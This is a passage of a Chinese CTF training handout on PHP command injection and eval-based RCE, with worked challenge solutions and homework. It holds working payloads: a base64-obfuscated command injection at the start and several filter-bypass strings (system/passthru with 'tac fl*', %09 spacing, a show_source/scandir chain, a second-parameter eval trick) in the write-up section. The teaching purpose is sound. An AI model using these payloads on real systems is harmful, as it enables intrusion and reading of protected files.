?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

**`bash`** 和 **`sh`** 是 Unix/Linux 系统中常见的 **Shell** 类型。Shell 是一种命令行解释器，它提供用户与操作系统之间交互的接口。通过 Shell，你可以运行命令、编写脚本来自动化任务、管理文件系统等。

## 其他

- \* 星号

**通配符 (Wildcard)**

这是星号最常见的用法。在文件名扩展 (Filename expansion) 中，它可以代表任何字符，包括空字符。例如：

- `ls *.txt`  会列出当前目录下所有以 `.txt` 结尾的文件。
- `rm -rf *` 会删除当前目录下的所有文件和目录 (**请谨慎使用！**)

示例：

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQzMGYwMjYyZjdkOWRiYjMyNjBlNTVmODM0NDEzN2JfNXVDQ1NnbHo5bk9IZjA3bVo2QzZUZ2xuWVhrYjBXVzlfVG9rZW46VVNka2JUUEtJb1pmejN4OEFPR2NiN2VNbnFiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

- `preg_match`函数
  - ![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZhNDYzN2VlM2I1OWU2NjcwNWMxMDgwN2JmODc0YjBfOVA5QTdReURlSTVOMmFHR2Z2dkcxM09aQ1RBdjQ3UlZfVG9rZW46Vk1Na2JFSDRtbzJvUmh4dzhaMmNpcUE3bmhiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)
  -  示例：
  -  成功匹配返回 `1`。
  -  如果没有匹配到内容，返回 `0`。
  -  如果发生错误，返回 `false`。

```PHP
<?php
$pattern = "/hello/";
$text = "hello world";
if (preg_match($pattern, $text)) {
    echo "匹配成功！";
} else {
    echo "没有匹配到内容。";
}
?>
```

- 简单检测脚本

> 对于单个过滤字符进行检测，输出可以使用的字符

```PHP
<?php
//检测可用字符

//检测可用字符
function is_preged($a){
    if (preg_match('/^[a-zA-Z0-9]+$/', $a)){
        return true;
    }
}

//输出可用字符
for($a = 0; $a < 256; $a++){
    if (!is_preged(chr($a))){
        echo chr($a)." ";
    }
}
```

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmQ4NmFkNDRhNjMzMmYzODllYzBjNTg2MmUzMzYyM2Zfa1ljZ29aYXU4dXcycld0OElLaEdnb0JPNFdZanYzZ1lfVG9rZW46UldhcWJLNHQzb2EyV2l4bXhRM2MyUnJ1bkFkXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

- PHP代码内容不能明文显示

!!!! 这是一个比较重要的细节

例子：

```PHP
<?php
echo "<?php exec('code .');?>";
```

展示视图里面什么也没有

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDk2YzJjY2VmNDFiMGVhZGVlOGI1NTg3MWEzM2I1OTdfRG00MXN0aVozemp3ZVo4YTdvbzRxSzVYMVRuMWY3UHhfVG9rZW46RUF0bWI0em9xbzUwa3R4T3dmR2M0RFhUblRjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

查看网站源代码，才能看到内容

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzkyN2IzMzdjODIzMDdlOGY3MzM0NzI2ZDVmNzYxYzRfRWdEM2l1QUZxVWlqNjBNNDFpRmloR2pua1JQN2FiYW9fVG9rZW46RnhhTGJJempkbzY4dnN4M0lyMGNsaWRjbnpiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

- hackbar使用

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjdjNTE1ODNhYmMwODBkOGI4MThlMTlmOTg5YzgxNWZfTWltekJMZVBQQnlHemZ3elF0WkZRUU1xRFpvcGVnTXdfVG9rZW46VHZHOWJnSWNGbzBrV1J4UUhFSGMxYmZFbm5oXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

*单引号字符和双引号字符*

在 PHP 中，双引号 (`" "`) 和单引号 (`' '`) 都可以用来表示字符串，但它们有一些关键区别：

1. **双引号 (**`**" "**`**)**

- 双引号字符串会解析特殊字符和变量。
- 可以在双引号中直接使用变量，PHP 会将变量替换为其值。
- 支持转义字符，例如 `\n`（换行符）、`\t`（制表符）、`\\`（反斜杠）等。

**示例**：

```PHP
$name = "Alice";
echo "Hello, $name\n";  // 输出：Hello, Alice (并换行)
```

在这里，`$name` 会被解析为变量的值，`\n` 也会被解析为换行符。

1. **单引号 (**`**' '**`**)**

- 单引号字符串不会解析变量或特殊字符（除了少数几个转义字符）。
- 在单引号字符串中，变量会被当作普通文本处理。
- 唯一支持的转义字符是 `\'`（单引号）和 `\\`（反斜杠）。

**示例**：

```PHP
$name = 'Alice';
echo 'Hello, $name\n';  // 输出：Hello, $name\n
```

在这里，`$name` 不会被解析为变量，而是直接作为字符串输出，`\n` 也不会被解释为换行符。

总结：

- **双引号**：用于需要解析变量或转义字符的字符串。
- **单引号**：用于纯文本字符串，不需要解析任何变量或转义字符。

### 示范-WP

#### 第一题

```PHP
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
```

ban了"flag"这个字符利用匹配

```Python
?c=system("tac fl*");
?c=system("tac fla''g.php");
?c=system("tac fla``g.php");
```

#### 第二题

相比于上一题多ban了`php` , `system`

```Plain
?c=passthru("tac fl*");
```

#### 第三题

```PHP
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
```

又是多ban了几个东西

```Python
#常规操作
?c=passthru("tac%09fla*");
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=eval($_GET[a]);&a=system('tac flag.php');#这里只是过滤了c参数里面的内容，利用这个东西可以实现绕过
```

> 简单的解释一下这个`show_source(next(array_reverse(scandir(pos(localeconv())))));`

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjVjMjAyMDdhMjY1MzYxNDRjMDk3NTNkODhhNmE4NThfSHRndUFuVElHZEhZdGZRSndES3owVElDOFdpcjNyNlNfVG9rZW46VWN5SGI2eENhb1VzQ294SThRU2NsaFJibkZjXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWU0YTc1ZGQzMWU2YjM5MmQwNDFlOWY0M2Q2YjI3YzJfNzVrTVlCTlZjWE83Vko0MFVQcHNWNVdEajR3MldUNzlfVG9rZW46QXdwUGJmZEpMb2NyTjF4NWZPQWNPQ3VTbkpiXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

`localeconv()` 返回当前地区设置的一个关联数组。

`pos(localeconv())` 获取该数组中的第一个元素。

将该元素作为目录路径，调用 `scandir()` 获取该目录中的文件列表。

反转文件列表（`array_reverse()`）。

返回反转后的文件列表中的下一个元素（`next()`）。

最后，调用 `show_source()` 尝试显示该文件的内容。

## 提升学习

学有余力的话可以继续学习下面几个方向

- 反弹shell
- 无字母RCE
- 无参数RCE
- 无回显命令执行
- 文件包含，各种协议的了解

# 作业

！重要要求

学习并写完题目后，编写学习笔记和解题Wp（需含图片），

按照要求提交PR至 https://github.com/natro92/2025WinTraining 处。

> 要求记录你的学习历程和知识点

1. Ctfhub-RCE模块----命令注入

地址：https://www.ctfhub.com/#/skilltree

![img](https://rcnq8t428wlu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYzZTIzZjc1YWE1Y2JkYjNlYjM3NjdmNTg5NmFiODRfNUpOdmNuTjBFMFM1Nlo0WFY0U2NCeTRBTWFua0ExbVpfVG9rZW46UE5pNWI0YlJVb0t5bDV4MGZaUWNCV2JTbmdnXzE3MzY3ODEzNjc6MTczNjc4NDk2N19WNA)

1. 完成RCE-labs[0-8]题（写wp和学习笔记）

https://www.nssctf.cn/problem

1. 学习Linux基本命令和操作，自己搭建一个Linux环境（Vmware或者wsl都可以）记录并写下笔记
2. 学习PHP基本语法
3. 学有余力可以继续学习其他内容和知识，一样的要求记录笔记提交

# 一些资料

> 更多的面对自己的困惑利用搜索引擎去搜索和查询，同时可以借助大模型提高我们的效率

- Linux命令手册

https://www.freecodecamp.org/chinese/news/the-linux-commands-handbook/

- linux深入，一篇文章

https://medium.com/@gzanan/%E5%BC%80%E7%AF%87-69b29a11f71d

- PHP官方文档

https://www.php.net/manual/zh/index.php

- CTFSHWOW-命令执行题解

https://exp10it.io/2022/08/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-55-writeup/

- 正则表达式学习

https://regexlearn.com/zh-cn/learn

- 正则表达式在线

https://regex101.com/

- Linux特殊字符

https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html

- 不同shell脚本类型

https://juejin.cn/post/7382892409815859209